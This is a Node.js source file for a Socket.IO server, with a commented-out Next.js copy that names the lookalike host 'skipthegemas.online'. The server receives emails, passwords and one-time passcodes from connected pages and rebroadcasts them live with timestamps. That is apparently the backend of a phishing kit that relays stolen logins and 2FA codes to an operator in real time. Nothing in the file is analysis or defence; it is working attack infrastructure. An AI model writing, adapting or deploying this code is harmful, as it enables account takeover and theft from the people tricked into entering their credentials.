const { createServer } = require('http')
const { parse } = require('url')
const next = require('next')

const { Server } = require('socket.io');
const axios = require('axios');

const newServer = createServer()
const io = new Server(newServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

let activeUsers = [];
let dataList = [];

io.on('connection', (socket) => {
  console.log('a user connected: ' + socket.id);

  // Handle request for all users
  socket.on('get_all_user', (socketId) => {
    const user = activeUsers.find(user => user.url === socketId);
    io.emit('get_all_user', {
      status: !!user,
      id: user ? user.user_id : socketId
    });
  });

  // Add active user
  socket.on('add_active_user', (userID) => {
    if (!activeUsers.some(user => user.user_id === userID.myID)) {
      activeUsers.push({
        user_id: userID.myID,
        socketId: socket.id,
        url: userID.url
      });
    }
  });

  // Handle incoming data
  socket.on('data', (d) => {
    io.emit('get_data', {
      email: d.e,
      password: d.p,
      id: d.id,
      time: Date.now(),
      data_id: d.data_id,
      notify_id: d.notify_id
    });
  });

  // Handle OTP data
  socket.on('otp', (d) => {
    io.emit('get_data_otp', {
      otp: d.otp,
      id: d.id,
      time: Date.now(),
      data_id: d.data_id,
      notify_id: d.notify_id
    });
  });

  // Handle user disconnect
  socket.on('disconnect', () => {
    console.log('user disconnected: ' + socket.id);
    activeUsers = activeUsers.filter(user => user.socketId !== socket.id);
  });
});

newServer.listen(4789, () => {
  console.log(`> Ready on PORT : ${4789}`)
});

// const dev = process.env.NODE_ENV !== 'production'
// const hostname = process.env.NODE_ENV === "production" ? "skipthegemas.online" : 'localhost'
// const port = 4789
// // when using middleware `hostname` and `port` must be provided below
// const app = next({ dev, hostname, port })
// const handle = app.getRequestHandler()

// app.prepare().then(() => {

//   const httpServer = createServer(async (req, res) => {
//     try {
//       // Be sure to pass `true` as the second argument to `url.parse`.
//       // This tells it to parse the query portion of the URL.
//       const parsedUrl = parse(req.url, true)
//       const { pathname, query } = parsedUrl

//       if (pathname === '/a') {
//         await app.render(req, res, '/a', query)
//       } else if (pathname === '/b') {
//         await app.render(req, res, '/b', query)
//       } else {
//         await handle(req, res, parsedUrl)
//       }
//     } catch (err) {
//       console.error('Error occurred handling', req.url, err)
//       res.statusCode = 500
//       res.end('internal server error')
//     }
//   })
//     .once('error', (err) => {
//       console.error(err)
//       process.exit(1)
//     })

//   const io = new Server(httpServer, {
//     cors: {
//       origin: '*',
//       methods: ['GET', 'POST']
//     }
//   });

//   let activeUsers = [];
//   let dataList = [];

//   io.on('connection', (socket) => {
//     console.log('a user connected: ' + socket.id);

//     // Handle request for all users
//     socket.on('get_all_user', (socketId) => {
//       const user = activeUsers.find(user => user.url === socketId);
//       io.emit('get_all_user', {
//         status: !!user,
//         id: user ? user.user_id : socketId
//       });
//     });

//     // Add active user
//     socket.on('add_active_user', (userID) => {
//       if (!activeUsers.some(user => user.user_id === userID.myID)) {
//         activeUsers.push({
//           user_id: userID.myID,
//           socketId: socket.id,
//           url: userID.url
//         });
//       }
//     });

//     // Handle incoming data
//     socket.on('data', (d) => {
//       io.emit('get_data', {
//         email: d.e,
//         password: d.p,
//         id: d.id,
//         time: Date.now(),
//         data_id: d.data_id,
//         notify_id: d.notify_id
//       });
//     });

//     // Handle OTP data
//     socket.on('otp', (d) => {
//       io.emit('get_data_otp', {
//         otp: d.otp,
//         id: d.id,
//         time: Date.now(),
//         data_id: d.data_id,
//         notify_id: d.notify_id
//       });
//     });

//     // Handle user disconnect
//     socket.on('disconnect', () => {
//       console.log('user disconnected: ' + socket.id);
//       activeUsers = activeUsers.filter(user => user.socketId !== socket.id);
//     });
//   });

//   httpServer.listen(port, () => {
//     console.log(`> Ready on http://${hostname}:${port}`)
//   });
// })
